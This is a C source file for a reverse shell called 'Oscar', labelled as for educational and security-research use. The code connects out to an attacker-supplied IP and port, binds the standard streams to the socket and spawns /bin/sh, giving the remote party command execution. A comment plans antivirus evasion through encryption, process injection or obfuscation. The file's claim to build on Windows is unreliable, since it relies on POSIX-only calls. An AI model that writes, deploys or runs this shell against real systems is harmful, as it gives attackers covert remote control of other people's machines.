/*
 * =====================================================
 * Oscar Reverse Shell - Windows/Linux (C Version)
 * For Educational & Security Research Purposes Only
 * =====================================================
 * 
 * A simple reverse shell that connects back to a listener
 * and provides remote command execution.
 * 
 * Compile (Linux):  gcc -o client client.c
 * Compile (Win):    x86_64-w64-mingw32-gcc -o client.exe client.c -lws2_32
 * 
 * Usage: ./client <IP> <PORT>
 * Example: ./client 192.168.1.100 4444
 * 
 * TODO: Figure out how to make it bypass antivirus detection
 *       - Maybe use encryption?
 *       - Or process injection?
 *       - Or obfuscation?
 *       - Gotta research this more...
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>

#ifdef _WIN32
    #include <winsock2.h>
    #include <windows.h>
    #pragma comment(lib, "ws2_32.lib")
#else
    #include <unistd.h>
#endif

int main(int argc, char *argv[]) {
    int sockfd;
    struct sockaddr_in server_addr;
    char *shell[] = {"/bin/sh", NULL};
    
    // Check arguments
    if (argc != 3) {
        printf("Usage: %s <IP> <PORT>\n", argv[0]);
        printf("Example: %s 127.0.0.1 4444\n", argv[0]);
        return 1;
    }
    
    char *ip = argv[1];
    int port = atoi(argv[2]);
    
    // Create socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("[-] Socket creation failed");
        return 1;
    }
    
    // Setup server address
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    server_addr.sin_addr.s_addr = inet_addr(ip);
    
    // Connect to listener
    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("[-] Connection failed");
        close(sockfd);
        return 1;
    }
    
    printf("[+] Connected to %s:%d\n", ip, port);
    
    // Redirect stdin, stdout, stderr to socket
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);
    
    // Spawn shell
    execve("/bin/sh", shell, NULL);
    
    // If execve fails
    perror("[-] execve failed");
    close(sockfd);
    return 1;
}